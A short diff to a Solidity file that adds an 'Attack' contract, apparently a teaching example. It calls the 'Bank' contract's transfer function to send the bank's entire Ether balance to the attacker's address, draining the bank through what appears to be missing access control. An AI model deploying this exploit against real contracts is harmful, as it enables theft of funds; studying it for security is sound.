@@ -14,3 +14,17 @@ contract Bank {
         require(sent , "Failed to send Ether");
     }
 }
+
+contract Attack {
+    address payable public hacker;
+    Bank bank;
+
+    constructor(Bank _bank) {
+        bank = Bank(_bank);
+        hacker = payable(msg.sender);
+    }
+
+    function attack() public {
+        bank.transfer(hacker , address(bank).balance);
+    }
+}
